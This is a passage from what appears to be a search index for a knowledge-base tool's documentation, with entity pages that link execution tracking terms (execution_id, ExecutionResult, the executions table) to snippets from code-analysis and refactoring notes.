</li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Tier 1: Essential (implement first)</p> <p>...R FK\u2192tasks | Which task produced this doc | Auto-detect from EMDX_TASK_ID env | | <code>execution_id</code> | INTEGER FK\u2192executions | Which execution created this | Auto-detect | | <code>session_id</code> | TEXT | Claude Code session UUID | Auto-detect from env |</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns</p> <p>Hierarchy Needs:</p> </li> <li>Flat access via tags and IDs</li> <li>Categories only for numbering: <code>SEC-42</code></li> <li>Delegate task tracking via <code>execution_id</code></li> <li> <p>Source doc links: <code>--doc 42</code></p> </li> <li> <p>#6304 Delegate: Analyze NAMING &amp; CLARITY across emdx/ (exclude ui/ and tests [1/15]   Section: <code>exec_id</code> vs <code>execution_id</code></p> Usage Location <code>exec_id</code> <code>models/executions.py:87</code> (parameter name) <code>execution_id</code> <code>services/claude_executor.py:69</code> (parameter name) </li> <li> <p>#6194 Analysis: Delegate + Activity Browser Issues   Section: 6 Issues Found</p> <p>...Problem: Execution created without link back to the creating task. Task gets <code>execution_id</code> set, but execution has no <code>task_id</code>.</p> </li> <li> <p>Impact: Activity query can't join tasks table to get source_doc_id, tags, parent info.</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Data Written to DB by Delegate</p> <p>tasks table:</p> </li> <li><code>prompt</code>: First 500 chars of prompt</li> <li><code>type</code>: \"single\", \"group\", or \"chain\"</li> <li><code>execution_id</code>: Set after UnifiedExecutor returns</li> <li><code>output_doc_id</code>: Set when agent saves output doc</li> <li> <p><code>status</code>: \"active\" \u2192 \"done\"/\"failed\"</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...gration 034):</p> </li> <li><code>prompt</code>: Original prompt text</li> <li><code>type</code>: single | group | chain</li> <li><code>execution_id</code>: Links to executions table</li> <li><code>output_doc_id</code>: Result document</li> <li><code>source_doc_id</code>: Input document</li> <li><code>parent_task_id</code>: Hierarchical parent</li> <li> <p><code>seq</code>: Sequence number in...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...evels 1-5 with gameplan linkage</p> </li> <li> <p>Fields for delegate activity: <code>prompt</code>, <code>type</code>, <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>seq</code>, <code>retry_of</code>, <code>tags</code></p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: 2. Tasks System</p> <p>...ed_at, updated_at, completed_at,   -- Delegate tracking additions:   prompt, type, execution_id, output_doc_id,   source_doc_id, parent_task_id, seq, retry_of, error, tags ```</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 2. Task Executions Table (<code>models/task_executions.py</code>)</p> <p>...R PK | Auto-incrementing ID | | <code>task_id</code> | INTEGER FK | Links to tasks table | | <code>execution_id</code> | INTEGER FK | Links to executions table | | <code>execution_type</code> | TEXT | workflow/direct/manual | | <code>status</code> | TEXT | running/completed/failed/cancelled | | `started_...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: Task System Architecture</p> <p>...via <code>task_deps</code> table</p> </li> <li> <p>Fields for tracking <code>emdx delegate</code> executions: <code>prompt</code>, <code>execution_id</code>, <code>output_doc_id</code></p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> <p>...ution | | <code>type</code> | TEXT | \"single\" | Task type: single, parallel, chain, etc. | | <code>execution_id</code> | INTEGER | NULL | FK to executions table | | <code>output_doc_id</code> | INTEGER | NULL | FK to documents (output doc) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: The Task Table Has Dual Purposes</p> <p>...ends_on`</p> </li> <li> <p>Delegate activity logging: <code>prompt</code>, <code>type</code> (single/group/chain), <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, <code>retry_of</code></p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> <ol> <li>Links to execution AFTER (line 238):</li> </ol> </li> <li><code>_safe_update_task(task_id, execution_id=result.execution_id)</code></li> </ul>"},{"location":"entities/executionid/#related-entities","title":"Related Entities","text":"<ul> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.1)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.1)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.1)</li> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.1)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.1)</li> <li><code>task creation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.9)</li> <li><code>output_doc_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (19 shared docs, PMI=4.8)</li> <li><code>parent_task_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (9 shared docs, PMI=4.8)</li> <li><code>exit_code</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=4.8)</li> <li><code>mapping[str, any]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/executionresult/","title":"executionresult","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-01-11</p>"},{"location":"entities/executionresult/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6584 Delegate: Add missing all exports to emdx/services/cli_executor/__ [1/2]   Section: <code>emdx/services/__init__.py</code> \u2014 9 Symbols Added</p> <p>...scriber<code>|</code>log_stream<code>|</code>ui/log_browser.py<code>,</code>ui/activity/activity_view.py<code>| |</code>ExecutionResult<code>|</code>unified_executor<code>|</code>synthesis_service.py<code>,</code>tests/test_delegate_commands.py<code>,</code>tests/test_compact.py<code>| |</code>ExecutionConfig<code>|</code>unified_executor<code>|</code>synthesis_se...</p> </li> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]   Section: 2. Retryable Error Detection</p> <p>```python def is_retryable_error(result: ExecutionResult) -&gt; bool:     \"\"\"Determine if an execution failure is worth retrying.</p> </li> <li> <p>#6494 None Type Analysis [5/7]   Section: unified_executor.py</p> <p>...ter execution completes</p> </li> <li><code>None</code> only makes sense before subprocess finishes</li> <li>In <code>ExecutionResult</code>, it's always set from actual exit codes</li> <li> <p>Verdict: Could be <code>int = 0</code> as default, but <code>None</code> indicates \"not yet determined\"</p> </li> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em   Section: Test Coverage</p> </li> <li>Mocked <code>UnifiedExecutor</code> and <code>ExecutionResult</code> for isolated testing</li> <li>Mocked <code>subprocess.run</code> for discovery command tests</li> <li>Mocked <code>get_document</code> for document resolution tests</li> <li> <p>Mocked `emdx.utils.git.create_wor...</p> </li> <li> <p>#6194 Analysis: Delegate + Activity Browser Issues   Section: 6 Issues Found</p> <p>...to DB</p> </li> <li>Location: <code>emdx/services/unified_executor.py:389-421</code></li> <li>Problem: <code>ExecutionResult</code> captures tokens/cost but they're never persisted to the executions table (no columns exist).</li> <li> <p>Impact: Activity browser shows cost: 0.0 for all delegate runs.</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: Different Execution Paths:</p> <ol> <li>delegate.py \u2192 <code>unified_executor.UnifiedExecutor.execute()</code></li> </ol> </li> <li>Waits for completion</li> <li>Streams output, captures result</li> <li> <p>Returns structured <code>ExecutionResult</code> with tokens, cost, content</p> </li> <li> <p>#4894 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Tier 3: Medium Priority (Backlog)</p> <p>3.2 Add TypedDicts for Data Structures</p> </li> <li><code>ExecutionResult</code>, <code>DocumentRecord</code>, <code>WorkflowConfig</code></li> <li> <p>Replace 127 instances of <code>Dict[str, Any]</code></p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...result: emdx/utils/git_ops.py:class GitWorktree: emdx/workflows/services.py:class ExecutionResult(TypedDict)... [00:03:08] \ud83d\udcc4 Tool result: \"\"\" Duplicate detection service for EMDX. Finds exact and near-duplicate documents based on content ... [00:03:08] \ud83d\udcc4 Tool res...</p> </li> </ul>"},{"location":"entities/executionresult/#mocking-approach","title":"Mocking Approach","text":""},{"location":"entities/executionresult/#related-entities","title":"Related Entities","text":"<ul> <li><code>unified_executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>key metrics</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>run_task()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>exception handling</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>emdx/services/similarity.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>tests/test_delegate_commands.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.3)</li> <li><code>except exception: pass</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.3)</li> <li><code>location</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.1)</li> <li><code>unifiedexecutor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.6)</li> <li><code>execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.6)</li> </ul>"},{"location":"entities/executionresulttodict/","title":"executionresult.to_dict()","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/executionresulttodict/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Delegate: Fix PR #687 \u2014 Add ExecutionResultDict TypedDict</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dict()</p> </li> <li> <p>#6583 Delegate synthesis [synthesis]   Section: Task 1: <code>emdx/services/</code> \u2014 Functions returning <code>dict[str, Any]</code></p> <p>5 locations across 3 files:</p> </li> <li><code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code> (intentional exception per CLAUDE.md)</li> <li><code>synthesis_service.py:140</code> \u2014 <code>synthesize_documents()</code> parameter <code>documents: list[dict[str, Any]]</code></li> <li> <p>`synthesis_service.py:...</p> </li> <li> <p>#6579 Delegate: Add a TypedDict for the dict returned by ExecutionResult.to_   Section: Changes</p> <p>Added <code>ExecutionResultDict</code> TypedDict to <code>emdx/services/types.py</code> and annotated the return type of <code>ExecutionResult.to_dict()</code> in <code>emdx/services/unified_executor.py</code>.</p> </li> <li> <p>#6577 Delegate: Audit emdx/services/ for functions that still return dict[str, Any] [1/3]   Section: 1. <code>unified_executor.py:192</code> \u2014 <code>ExecutionResult.to_dict()</code></p> <p>...this is listed as an intentional exception in CLAUDE.md (<code>unified_executor.py ExecutionResult.to_dict()</code> \u2014 serialization method). Low priority but could still benefit from a TypedDict.</p> </li> <li> <p>#6434 Any/None typing audit [4/5]   Section: unified_executor.py</p> <p>...Replacement | |----------|--------------|--------------|----------------------| | <code>ExecutionResult.to_dict()</code> | Return <code>dict[str, Any]</code> | \u26a0\ufe0f Low priority | Could use TypedDict but serialization often needs Any |</p> </li> </ul>"},{"location":"entities/executionresulttodict/#task","title":"Task","text":"<p>Redo stale PR #687 from current main: add <code>ExecutionResultDict</code> TypedDict for <code>ExecutionResult.to_dict()</code> return type.</p>"},{"location":"entities/executionresulttodict/#task_1","title":"Task","text":"<p>Add <code>ExecutionResultDict</code> TypedDict for the <code>ExecutionResult.to_dict()</code> return type, replacing <code>dict[str, Any]</code>.</p>"},{"location":"entities/executionresulttodict/#related-entities","title":"Related Entities","text":"<ul> <li><code>emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=6.6)</li> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.6)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>unified_executor.py:192</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>synthesisinputdocument</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>synthesis_service.py:390</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>synthesis_service.py:223</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>synthesis_service.py:140</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/executions/","title":"executions","text":"<p>Type: tech_term | Mentioned in: 20 documents | First seen: 2026-02-13</p>"},{"location":"entities/executions/#documents-20","title":"Documents (20)","text":"<ul> <li> <p>#6711 Delegate synthesis [synthesis]   Section: Key Findings</p> <p>Running delegates have limited real-time data. The <code>executions</code> table tracks PID, title, start time, and working directory at creation \u2014 but cost/token data is only written post-completion. A dashboard can show duration and PID-...</p> </li> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: PID-Based Liveness Detection</p> <p>Already implemented in <code>Execution.is_zombie</code> (executions.py:48-62):</p> </li> <li> <p>#6706 Delegate: Analyze the current Activity screen (emdx/ui/activity/) in d [1/4]   Section: What It Shows</p> <p>...into:</p> </li> <li>Activity table (70%) \u2014 flat <code>DataTable</code> of recent documents + agent executions, sorted by time (running pinned to top). Columns: status icon, title, relative time, ID</li> <li> <p>Context panel (30%) \u2014 document metadata: project, age, word count, v...</p> </li> <li> <p>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   Section: Database Integration</p> <p>Each execution creates a record in the <code>executions</code> table:</p> </li> <li> <p>#6560 Delegate: Recent Failures in emdx prime   Section: Summary</p> <p>...his feature adds a RECENT FAILURES section to prime output showing failed delegate executions from the last 24 hours with retry commands.</p> </li> <li> <p>#6530 Delegate: Review GitHub PR #651 using 'gh pr view 651' and 'gh pr diff [2/4]   Section: \ud83d\udd0d Edge Cases</p> <ol> <li>Execution records: The <code>executions</code> table had <code>cascade_run_id</code> column. Existing execution records with cascade_run_id values will have dangling references, but this shouldn't cause runtime issues (just unused foreign keys).</li> </ol> </li> <li> <p>#6411 Delegate: Implement 'emdx briefing' command. This is a new command tha   Section: Summary</p> <p>Implemented the <code>emdx briefing</code> command that synthesizes recent emdx activity into a human-readable summary. This provides a quick overview of what happened across tasks, documents, and delegate executions since a configurable cutoff time.</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Current State Analysis</p> <p>Existing related tables:</p> </li> <li><code>tags</code> / <code>document_tags</code> (many-to-many tag system)</li> <li><code>executions</code> (tracks Claude executions)</li> <li> <p><code>gists</code> (GitHub gist exports)</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: 6. WORKFLOW DIFFERENCES</p> <p>...face:</p> </li> <li>Wraps Claude execution with KB persistence</li> <li>Auto-creates tasks and tracks executions</li> <li>Handles parallel (<code>-j</code>), sequential (<code>--chain</code>), and discovery (<code>--each</code>)</li> <li>Creates PRs (<code>--pr</code>), uses worktrees (<code>--worktree</code>)</li> <li> <p>Key insight: Agents are *invo...</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...GINEERED - Analysis dashboard. Mostly read-only views of maintain.py data. | | executions.py | 561 | SUPPORT - Execution history viewer. Useful but could be simpler. | | groups.py | 452 | UNDERUTILIZED** - Document grouping system. Adds comple...</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...ion, parent_id for lineage</p> </li> <li><code>tags</code> / <code>document_tags</code> - emoji tags with aliases</li> <li><code>executions</code> - execution tracking with PID, log file, status</li> <li><code>documents_fts</code> - FTS5 virtual table</li> <li><code>cascade_runs</code> - pipeline execution tracking</li> <li> <p><code>tasks</code> - work queue with de...</p> </li> <li> <p>#6278 Delegate: DEBT-9: Fix migration debt. Create new migration files (foll   Section: DEBT-9: Fix Migration Debt</p> <p>...DELETE CASCADE | | <code>gdocs</code> | document_id | documents(id) | ON DELETE CASCADE | | <code>executions</code> | doc_id | documents(id) | ON DELETE SET NULL | | <code>export_history</code> | document_id | documents(id) | ON DELETE CASCADE | | <code>export_history</code> | profile_id | export_prof...</p> </li> <li> <p>#6271 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [33/37]   Section: Foreign Keys Missing ON DELETE Behavior</p> <p>executions table:</p> </li> <li><code>doc_id -&gt; documents(id)</code> </li> <li><code>task_id -&gt; tasks(id)</code></li> <li> <p><code>cascade_run_id -&gt; cascade_runs(id)</code></p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: Executive Summary</p> <p>This analysis investigates how the activity browser displays delegate executions, tracing the data flow from <code>emdx delegate</code> command through to the UI display. **Key finding: There are several mismatches and potential display bugs between what de...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>2. Task Executions Table (<code>emdx/models/task_executions.py</code>)</p> </li> <li>Join table linking tasks to actual executions</li> <li> <p>Execution types: <code>direct</code> (Claude), <code>manual</code> (human-completed), `workflo...</p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: Executive Summary</p> <p>...scade** (document stages: idea \u2192 prompt \u2192 analyzed \u2192 planned \u2192 done)</p> </li> <li> <p>Delegate Executions (execution tracking + task records)</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: Overview</p> <ol> <li><code>executions</code> table (via <code>emdx/models/executions.py</code>) - Low-level CLI execution tracking</li> </ol> </li> <li> <p><code>task_executions</code> table (via <code>emdx/models/task_executions.py</code>) - Task-to-executi...</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Current State</p> <p>...ased with <code>task_deps</code> table for dependencies</p> </li> <li>Tracking: <code>tasks</code> table + <code>task_executions</code> table</li> <li>Automation: Via <code>emdx delegate</code> which creates task records</li> <li>Features: </li> <li>Dependency management with cycle detection</li> <li> <p>Gameplan association (`ga...</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> </li> <li> <p><code>task_id</code> (required): Task ID</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Summary</p> <p>Delegate creates and updates tasks for every execution. There are two separate tracking systems (tasks and executions) that run in parallel, creating overlap.</p> </li> </ul>"},{"location":"entities/executions/#12-executions-show-execution-history","title":"12. <code>executions</code> \u2014 Show execution history","text":"<p>Arguments:</p>"},{"location":"entities/executions/#related-entities","title":"Related Entities","text":"<ul> <li><code>cascade_runs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.2)</li> <li><code>gists</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>doc_title</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>cascade</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>worktree isolation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>usage patterns</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>task_log</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>delegate executions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>task_deps</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=4.4)</li> </ul>"},{"location":"entities/executionspy/","title":"executions.py","text":"<p>Type: heading | Mentioned in: 20 documents | First seen: 2026-01-05</p>"},{"location":"entities/executionspy/#documents-20","title":"Documents (20)","text":"<ul> <li>#6503 None Type Analysis [2/7]   Section: File-by-File Analysis </li> <li><code>exec_id: int | None = typer.Argument(None)</code> in <code>kill</code> command - Legitimate: shows running executions if no ID</li> <li> <p><code>follow: bool = typer.Option(None, ...)</code> in `s...</p> </li> <li> <p>#6433 Any/None typing audit [2/5]</p> <ul> <li>Line 467: Intermediate dict before cast; keeping Any is acceptable here. ---</li> </ul> </li> </ul>"},{"location":"entities/executionspy/#executionspy_1","title":"executions.py","text":""},{"location":"entities/executionspy/#executionspy_2","title":"executions.py","text":"Location Usage Replaceable? Suggested Replacement Line 215 <code>**kwargs: Any</code> `upd... <ul> <li>#6416 Type System Audit: Replace Any/None with Concrete Types [1/4] <p><code>list_epics(...) -&gt; list[dict[str, Any]]</code> Location: Line 418 Keys: TaskDict + computed fields:</p> </li> <li>All <code>TaskDict</code> keys</li> <li><code>child_count: int</code></li> <li><code>children_open: int</code></li> <li><code>children_done: int</code></li> </ul> <p>Proposed TypedDict: ```python class EpicTaskDict(Task...</p> <ul> <li> <p>#6839 Delegate: list   Section: 1. <code>emdx/commands/delegate.py</code> \u2014 Subcommand routing fix</p> <p>...a delegate task prompt (\"list\") instead of routing to the <code>list</code> subcommand from <code>executions.py</code>. This happened because typer's <code>invoke_without_command=True</code> with a variadic <code>tasks</code> argument swallowed the subcommand name before click could dispatch it. There wa...</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Files by Priority</p> <p>...5 | 5 | | Medium | <code>text_areas.py</code> | 3 | 3 | | Low | <code>tasks.py</code> | 2 | 1 | | Low | <code>executions.py</code> | 1 | 1 | | Keep | <code>retry.py</code> | 8 | 0 | | Keep | <code>output.py</code> | 1 | 0 |</p> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: Review Summary</p> <p>..., get_stats()</p> </li> <li><code>groups.py</code>: get_recursive_doc_count(), _update_group_metrics()</li> <li><code>executions.py</code>: get_execution_stats() (2 locations)</li> <li><code>tags.py</code>: get_or_create_tag(), merge_tags()</li> <li> <p><code>tasks.py</code>: create_task() epic_seq</p> </li> <li> <p>#6396 Delegate: DB Safety Fixes (Tasks #620, #624, #626, #629)   Section: Summary</p> <p>...<code>:</code>get_or_create_tag()<code>,</code>merge_tags()`</p> </li> <li><code>tasks.py</code>: <code>create_task()</code> epic_seq</li> <li><code>executions.py</code>: <code>get_execution_stats()</code></li> <li> <p><code>groups.py</code>: <code>get_recursive_doc_count()</code>, <code>_update_group_metrics()</code></p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Layer Structure (Current)</p> <p>...\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 models/           Data models (actually repositories)        \u2502 \u2502 \u251c\u2500\u2500 executions.py Raw SQL operations                        \u2502 \u2502 \u251c\u2500\u2500 tags.py       Raw SQL operations                        \u2502 \u2502 \u2514\u2500\u2500 tasks.py      Raw SQL operations...</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 4. Opportunities to Extract Shared Helpers</p> </li> <li><code>status.py</code>: <code>_relative_time()</code>, <code>_running_duration()</code></li> <li> <p><code>executions.py</code>: inline time formatting</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 1. CRITICAL: <code>models/</code> is Actually a Database Layer**</p> <p>Files: <code>models/tags.py</code>, <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/documents.py</code></p> </li> <li> <p>#6279 Delegate: DEBT-8: Standardize CLI interfaces. Standardize doc_id param   Section: 1. Added Help Text to Typer Apps (9 files)</p> <p>...and list documents with statistics\" | | <code>gist.py</code> | \"GitHub Gist integration\" | | <code>executions.py</code> | \"Manage and monitor task executions\" | | <code>status.py</code> | \"Show delegate activity and project status\" | | <code>prime.py</code> | \"Output priming context for Claude session inj...</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 1. Added Help Text to 5 Typer Apps (Missing Documentation)</p> <p>...e\" | | <code>core.py</code> | \"Core document operations: save, find, view, edit, delete\" | | <code>executions.py</code> | \"Monitor and manage delegate executions\" | | <code>gist.py</code> | \"GitHub Gist integration for sharing documents\" | | <code>trash.py</code> | \"Manage deleted documents (trash)\" |</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...CLI) | | <code>core.py</code> | \u2705 YES (<code>test_commands_core.py</code>) | | <code>delegate.py</code> | \u274c NO | | <code>executions.py</code> | \u26a0\ufe0f PARTIAL (<code>test_execution_system*.py</code> tests models, not CLI) | | <code>gdoc.py</code> | \u274c NO | | <code>gist.py</code> | \u274c NO | | <code>groups.py</code> | \u2705 YES (<code>test_commands_groups.py</code>) | | `...</p> </li> <li> <p>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log</p> <p>...commands/analyze.py<code>- PENDING (still has</code>console = Console()<code>)\\n-</code>emdx/commands/executions.py<code>- PENDING (still has</code>console = Console()<code>)\\n-</code>emdx/ui/markdown_config.py<code>- Has local Console instantiation (likely intentional for markdown 